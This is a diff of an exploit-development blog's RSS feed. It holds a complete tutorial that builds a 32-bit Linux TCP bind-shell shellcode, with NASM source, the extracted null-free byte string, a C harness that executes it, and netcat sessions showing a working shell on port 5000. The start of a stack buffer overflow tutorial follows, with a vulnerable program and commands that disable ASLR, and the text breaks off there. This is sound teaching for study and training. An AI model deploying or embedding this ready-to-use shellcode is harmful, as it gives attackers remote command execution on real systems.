+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; setup the 3rd argument&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0b&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; set the EAX register to the execve sys call number&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; using al to remove any null bytes&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Right all done! Below is the code in all its glory!!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;kr&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;
+&lt;span class=&quot;kr&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; Zero out registers&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;; Setup Socket call&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;; AF_INET&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;                  &lt;span class=&quot;c&quot;&gt;; SOCK_STREAM = 1 - Leave EDX 0 for IP&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0167&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; Socket syscall number&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make call&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; store socketfd&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;; Now call bind&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; INADDR_ANY - IP to bind to in soccaddr_in&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8813&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Port in Network byte order&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bx&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; Address Family AF_INET&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; get pointer to structure&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; put server socket fd into ebx (use xchg to save a byte)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; set struct len&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0169&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; bind syscall&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make call&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;; Call listen&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; set up the backlog parameter&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x016B&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; set syscall number for listen&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; zero out registers&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x016c&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; set accept syscall&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; store the client socket fd in ebx so we can use for the dup call&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; setup dup2 call&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; call dup2&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;                 &lt;span class=&quot;c&quot;&gt;; decrement the loop counter&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;jns&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;loop&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; if the sign flag is not set then repeat the loop&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; this will tie our stdin, out and error to the client socket&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; push NULL onto stack to termins //bin/sh&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; push //bin/sh in reverse onto the stack&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69622f2f&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; see above&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; move address of //bin/sh into EBX (execve's 1st parameter)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; this serves two purposes 1, to use for EDX (we will pass no&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; environment to the shell and also as part of the array of&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; args that we will pass to as the 2nd arg of execve&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; see above&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; ESP now points to and array of args [address of //bin/sh, 0x00]&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; these will act as the args to //bin/sh&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; setup the 3rd argument&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0b&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; set the EAX register to the execve sys call number&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; using al to remove any null bytes&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets compile, link and run it&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ nasm -f elf32 -o bind.o bind_shell.nasm
+ $ ld -m elf_i386 -o bind bind.o
+ $ ./bind
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;And now on another shell&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ nc localhost 5000
+ls
+bind
+bind.o
+bind_shell
+bind_shell.c
+bind_shell.nasm
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Woop woop, party time!! Well not quite we wanted shellcode not and assembly
+program. Lets run this through objdump&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ objdump -d bind.o
+
+bind.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 &amp;lt;_start&amp;gt;:
+   0:   31 c0                   xor    %eax,%eax
+   2:   31 db                   xor    %ebx,%ebx
+   4:   31 c9                   xor    %ecx,%ecx
+   6:   31 d2                   xor    %edx,%edx
+   8:   31 ff                   xor    %edi,%edi
+   a:   b3 02                   mov    $0x2,%bl
+   c:   fe c1                   inc    %cl
+   e:   66 b8 67 01             mov    $0x167,%ax
+  12:   cd 80                   int    $0x80
+  14:   97                      xchg   %eax,%edi
+  15:   52                      push   %edx
+  16:   66 68 13 88             pushw  $0x8813
+  1a:   66 53                   push   %bx
+  1c:   89 e1                   mov    %esp,%ecx
+  1e:   87 df                   xchg   %ebx,%edi
+  20:   b2 10                   mov    $0x10,%dl
+  22:   66 b8 69 01             mov    $0x169,%ax
+  26:   cd 80                   int    $0x80
+  28:   87 ca                   xchg   %ecx,%edx
+  2a:   66 b8 6b 01             mov    $0x16b,%ax
+  2e:   cd 80                   int    $0x80
+  30:   31 c9                   xor    %ecx,%ecx
+  32:   31 f6                   xor    %esi,%esi
+  34:   66 b8 6c 01             mov    $0x16c,%ax
+  38:   cd 80                   int    $0x80
+  3a:   93                      xchg   %eax,%ebx
+  3b:   b1 02                   mov    $0x2,%cl
+
+0000003d &amp;lt;loop&amp;gt;:
+  3d:   b0 3f                   mov    $0x3f,%al
+  3f:   cd 80                   int    $0x80
+  41:   49                      dec    %ecx
+  42:   79 f9                   jns    3d &amp;lt;loop&amp;gt;
+  44:   31 c0                   xor    %eax,%eax
+  46:   50                      push   %eax
+  47:   68 6e 2f 73 68          push   $0x68732f6e
+  4c:   68 2f 2f 62 69          push   $0x69622f2f
+  51:   89 e3                   mov    %esp,%ebx
+  53:   50                      push   %eax
+  54:   89 e2                   mov    %esp,%edx
+  56:   53                      push   %ebx
+  57:   89 e1                   mov    %esp,%ecx
+  59:   b0 0b                   mov    $0xb,%al
+  5b:   cd 80                   int    $0x80
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Great we appear to have avoided the dreaded NULL bytes!!. Lets get this into
+shell code&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ for i in $(objdump -d bind.o | grep &quot;^ &quot; | cut -f2); do echo -n '\x'$i; done; echo
+\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13
+\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9
+\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73
+\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Lets put this into our shellcode test harness&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;\
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;\
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;\
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode Length:  %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+                  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+                          &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets run it&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gcc -o shell_test -fno-stack-protector -z execstack -m32 shell_test.c
+  $ ./shell_test
+Shellcode Length: 93
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;And now on another shell&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ nc localhost 5000
+ls
+bind
+bind.o
+bind_shell
+bind_shell.c
+bind_shell.nasm
+shell_test.c
+shell_test
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Great our reverse shell works and in 93 bytes which is not bad but I have found
+shellcode on shell-storm which does this extact function in 89 bytes. I may work
+on this to get it smaller but I think this is good enough for now.&lt;/p&gt;
+
+&lt;p&gt;Note: I had gotten this down to 87 bytes when running as a straight assembly
+program however when running in the C skeleton a few things became apparent and
+I needed to modify my code these were&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;I had to xor EDI as it was not 0x0 by the time my code go executed&lt;/li&gt;
+  &lt;li&gt;I had to re xor eax in the execve code as this was not 0 by the time my code
+got executed&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Cheers and happy shellcoding!&lt;/p&gt;
+
+</description>
+				<pubDate>Tue, 21 Mar 2017 17:00:00 +0000</pubDate>
+				<link>https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html</link>
+				<guid isPermaLink="true">https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html</guid>
+			</item>
+		
+			<item>
+				<title>Buffer Overflows: Level 1 (ret2stack)</title>
+				<description>&lt;h1 id=&quot;what-is-smashing-the-stack&quot;&gt;What is Smashing the Stack&lt;/h1&gt;
+&lt;p&gt;You may have heard the term buffer overflow or smashing the stack but what does
+this mean? Simply this just means that a program hasnt checked its inputs and
+important data on the stack has been overwritten (such as a functions return
+address). Lets have a quick look at what a functions stack frame may look like&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3: Arguments
+2: local buffer (64 chars)
+1: Frame Pointer
+0: Return Address
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So if the program is vulnerable and doesnt do any bounds checking when writing
+data into the local buffer then that data can literally overflow the buffer
+overwriting the values that come after it (such as the return address).&lt;/p&gt;
+
+&lt;p&gt;What this means for an attacker is that we have a way to control the flow of the
+programs execution, if we can overflow the buffer then we can overwrite the
+return address with an address which points to our malicious code and then when
+the function returns our code will get executed.&lt;/p&gt;
+
+&lt;h1 id=&quot;show-me-the-money&quot;&gt;Show me the money!&lt;/h1&gt;
+&lt;p&gt;Right below is a vulnerable C program. (follow along by using the vagrant file I
+supplied in my post about vagrant)&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets compile and run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gcc -fno-stack-protector -z execstack -o vuln vuln.c
+  $ ./vuln AAAA
+  AAAA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Good all working, notice we have turned off stack protection (stack canaries)
+and we have made the stack executable. There is one other protection we want to
+disable which is ASLR&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ sudo bash -c &quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Now we have a 32bit box circa 2009 ish. lets go break this thing. Fire up the
+program in gdb&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gdb ./vuln
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;First thing we want to do is to find out the size of the buffer that makes the
+program crash. Now the good old way was to create patterns with loads of AAAA’s
+followed by BBBB’s etc This was tiresome and tedious so some smart programmer
+(longld on github) created &lt;a href=&quot;https://github.com/longld/peda&quot;&gt;peda&lt;/a&gt; which is a gdb
+plugin to help with exploit development.&lt;/p&gt;
+
+&lt;p&gt;First we’ll create a cyclic pattern and set it to an argument&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  peda-gdb$ pattern create 100
